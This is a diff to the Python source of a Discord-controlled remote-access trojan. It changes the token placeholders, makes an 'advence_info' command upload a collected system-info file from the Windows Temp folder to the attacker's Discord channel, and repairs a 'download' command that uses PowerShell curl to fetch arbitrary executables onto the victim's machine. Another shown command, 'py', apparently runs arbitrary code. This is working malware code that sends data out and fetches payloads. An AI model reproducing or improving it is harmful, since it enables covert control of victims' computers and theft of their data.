@@ -1,5 +1,5 @@
-TOKEN = " # BOT TOKEN # "
-WEBHOOK_URL = " # WEBHOOK URL # "
+TOKEN = " # Discord Bot Token # "
+WEBHOOK_URL = " # Discord Webhook Url # "
 
 
 def webhook_info(content, username="Trojan"):
@@ -379,7 +379,7 @@ async def battery(ctx, pc):
 @trojan.command()
 async def advence_info(ctx, pc=pc_name):
     advence_info(f'c:\\WINDOWS\\Temp\\i.txt')
-    await ctx.send(f'c:\\WINDOWS\\Temp\\i.txt')
+    await ctx.send(file=discord.File(f'c:\\WINDOWS\\Temp\\i.txt'))
     os.remove(f'c:\\WINDOWS\\Temp\\i.txt')
 
 @trojan.command()
@@ -436,7 +436,7 @@ async def py(ctx, pc=pc_name, *, code):
             await ctx.send(f'**ERROR:**\n```yaml\n{e}\n```')
 
 trojan.command()
-async def download(ctx, pc=pc_name, link, out="OutFile.exe"):
+async def download(ctx, pc=pc_name, link="", out="OutFile.exe"):
     if pc == pc_name:
         os.system(f'powershell -c "curl {link} -OutFile {out}"')
 
